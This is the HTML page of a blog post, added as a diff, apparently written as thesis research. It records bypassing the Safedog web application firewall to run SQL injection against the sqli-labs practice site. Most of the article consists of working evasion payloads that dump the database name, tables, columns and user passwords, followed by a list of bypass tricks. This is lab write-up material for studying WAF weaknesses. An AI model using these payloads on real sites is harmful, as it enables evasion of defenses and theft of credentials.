@@ -1,0 +1,85 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="记一次绕狗进行sql注入"><meta name="keywords" content="sql注入,waf bypass"><meta name="author" content="SineX8"><meta name="copyright" content="SineX8"><title>记一次绕狗进行sql注入 | SineX8's Area</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  }
+} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#测试环境"><span class="toc-number">1.</span> <span class="toc-text">测试环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF安装"><span class="toc-number">2.</span> <span class="toc-text">WAF安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF绕过"><span class="toc-number">3.</span> <span class="toc-text">WAF绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="http://wx4.sinaimg.cn/large/892cef04gy1g3q7dooe9kj20h70h7q4j.jpg"></div><div class="author-info__name text-center">SineX8</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/SineX8">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">5</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">5</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(http://wx1.sinaimg.cn/large/892cef04gy1g3q663xhpjj20yw0lqh8q.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">SineX8's Area</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="post-info"><div id="post-title">记一次绕狗进行sql注入</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-10-24</time><span class="post-meta__separator">|</span><i class="fa fa-comment-o post-meta__icon" aria-hidden="true"></i><a href="/2019/10/24/记一次绕狗进行sql注入/#disqus_thread"><span class="disqus-comment-count" data-disqus-identifier="2019/10/24/记一次绕狗进行sql注入/"></span></a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>最近本人的毕设题目定了下来，是做关于waf bypass方面的研究，所以我就打算找几个市面上常用的waf绕一绕，第一个实验品就是安全狗。</p>
+<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a><strong>测试环境</strong></h2><ul>
+<li>操作系统：Windows</li>
+<li>中间件：APACHE 2.4</li>
+<li>数据库：MySql</li>
+<li>WAF名称：<a href="http://www.safedog.cn/" target="_blank" rel="noopener">安全狗</a></li>
+<li>WAF版本：Windows APACHE版 4.0<br><img src="//sinex8.github.io/2019/10/24/记一次绕狗进行sql注入/%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF.jpg" alt="版本信息"></li>
+</ul>
+<h2 id="WAF安装"><a href="#WAF安装" class="headerlink" title="WAF安装"></a><strong>WAF安装</strong></h2><p>安全狗的安装还蛮自动化的，需要注意的是如果使用的是phpstudy，可能会出现无法找到apache服务名的问题：<a href="https://blog.csdn.net/nzjdsds/article/details/93740686" target="_blank" rel="noopener">解决方案</a></p>
+<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a><strong>WAF绕过</strong></h2><p>测试用的网页来自于sqlilabs第一关，这一关是字符型注入。<br>首先判断sql语句里有几列，需要使用order by来查看<br>尝试?id=1’ order by 1#<br><img src="//sinex8.github.io/2019/10/24/记一次绕狗进行sql注入/%E5%9B%BE%E7%89%871.png" alt="拦截"><br>结果肯定是被waf拦截，尝试?id=1’ order xby 1%23<br><img src="//sinex8.github.io/2019/10/24/记一次绕狗进行sql注入/%E5%9B%BE%E7%89%872.png" alt="未被拦截"><br>出现报错，接下来就考虑用各种姿势替换掉x<br>尝试了以下几种：（%23=#，%0a=换行符）</p>
+<ul>
+<li><strong>?id=1’ order/</strong>/by 1%23**        拦截</li>
+<li><strong>?id=1’ order/<em>!</em>/by 1%23</strong>        拦截</li>
+<li><strong>?id=1’ order%0aby 1%23</strong>        拦截</li>
+<li><strong>?id=1’ order%23%0Aby 1%23</strong>        未被拦截<br>最后得出sql语句中有3个字段。</li>
+</ul>
+<p>尝试?id=1’ union select 1,2%23<br><img src="//sinex8.github.io/2019/10/24/记一次绕狗进行sql注入/%E5%9B%BE%E7%89%873.png" alt="拦截"><br>结果肯定是被拦截，尝试：</p>
+<ul>
+<li><strong>?id=1’ xunion select 1,2,3%23</strong>        拦截</li>
+<li><strong>?id=1’ uxnion select 1,2,3%23</strong>        未被拦截</li>
+<li><strong>?id=1’ unionx select 1,2,3%23</strong>        未被拦截</li>
+<li><strong>?id=1’ union xselect 1,2,3%23</strong>        未被拦截</li>
+</ul>
+<p>开始替换：</p>
+<ul>
+<li><strong>?id=-1’union/<em>!</em>/select 1,2,3%23</strong>                        拦截</li>
+<li><strong>?id=-1’union/<em>!select</em>/ 1,2,3%23</strong>                        拦截</li>
+<li><strong>?id=-1’union/*!/</strong>/<em>/select 1,2,3%23*</em>                    拦截</li>
+<li><strong>?id=-1’union/<em>!/</em>xxx<em>/</em>/select 1,2,3%23</strong>                拦截</li>
+<li><strong>?id=-1’union/*!/</strong>/<em>/%0A select 1,2,3%23*</em>                拦截</li>
+<li><strong>?id=-1’union/*!/</strong>/<em>/%23%0A select 1,2,3%23*</em>            拦截</li>
+<li><strong>?id=-1’union/*!/</strong>/<em>/– -%23%0A select 1,2,3%23*</em>         拦截</li>
+<li><strong>?id=-1’union/*!/</strong>/<em>/– -xxxx%23%0Aselect 1,2,3%23*</em>    未被拦截</li>
+</ul>
+<p><strong>库名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;union/*!/**/*/-- -xxxx%23%0Aselect 1,/*!database*/%23%0A(),3%23</span><br></pre></td></tr></table></figure>
+
+<p><strong>表名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;union/*!/**/*/-- -xxxx%23%0Aselect 1,table_name,3 %23%0Afrom information_schema.tables where table_schema = /*!database*/%23%0A() limit 3,4%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="//sinex8.github.io/2019/10/24/记一次绕狗进行sql注入/%E5%9B%BE%E7%89%874.png" alt="users表名"><br><strong>字段名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;union/*!/**/*/-- -xxxx%23%0Aselect 1,group_concat(column_name),3 %23%0Afrom information_schema.columns where table_name = &apos;users&apos; %26%26 table_schema = /*!database*/%23%0A()%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="//sinex8.github.io/2019/10/24/记一次绕狗进行sql注入/%E5%9B%BE%E7%89%875.png" alt="字段名"><br><strong>获取敏感数据</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;union/*!/**/*/-- -xxxx%23%0Aselect 1,group_concat(username),group_concat(password) %23%0Afrom users%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="//sinex8.github.io/2019/10/24/记一次绕狗进行sql注入/%E5%9B%BE%E7%89%876.png" alt="敏感数据"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>安全狗属于通过正则匹配进行注入检测的WAF，所以目标就是要寻找狗的正则匹配的漏洞，我总结了一下这次绕过的一些步骤：</p>
+<ol>
+<li>使用简短的字符（本次测试中用的字母x）插入到语句之间，如果出现未触发waf的情况就记录下来</li>
+<li>根据未触发waf的情况，将插入的简短字符替换成各种常用的绕过姿势，直到不触发waf为止</li>
+</ol>
+<p>本篇用到的绕过姿势也总结一下：</p>
+<ul>
+<li>/<em>!</em>/</li>
+<li>/<em>!（版本号）（要执行的语句）</em>/（版本号为00000~99999）</li>
+<li>/**/</li>
+<li>%26%26（&amp;&amp;）</li>
+<li>%23%0a（#和换行符）</li>
+<li>%0a</li>
+<li>如果%23%0a不行，尝试– -%0a和– -（无用字符）%0a</li>
+<li>待更新</li>
+</ul>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">SineX8</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://sinex8.github.io/2019/10/24/记一次绕狗进行sql注入/">http://sinex8.github.io/2019/10/24/记一次绕狗进行sql注入/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://sinex8.github.io">SineX8's Area</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql注入/">sql注入</a><a class="post-meta__tags" href="/tags/waf-bypass/">waf bypass</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2019/06/22/CTF打怪升级录-sqli-SCUCTF-登陆一下/"><span>CTF打怪升级录: sqli-SCUCTF-登陆一下</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="disqus_thread"></div><script>var unused = null;
+var disqus_config = function () {
+  this.page.url = 'http://sinex8.github.io/2019/10/24/记一次绕狗进行sql注入/';
+  this.page.identifier = '2019/10/24/记一次绕狗进行sql注入/';
+  this.page.title = '记一次绕狗进行sql注入';
+}
+var d = document, s = d.createElement('script');
+s.src = "https://" + 'SineX8' +".disqus.com/embed.js";
+s.setAttribute('data-timestamp', '' + +new Date());
+(d.head || d.body).appendChild(s);</script><script id="dsq-count-scr" src="https://SineX8.disqus.com/count.js" async></script></div></div><footer class="footer-bg" style="background-image: url(http://wx1.sinaimg.cn/large/892cef04gy1g3q663xhpjj20yw0lqh8q.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2019 By SineX8</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+}</script></body></html>
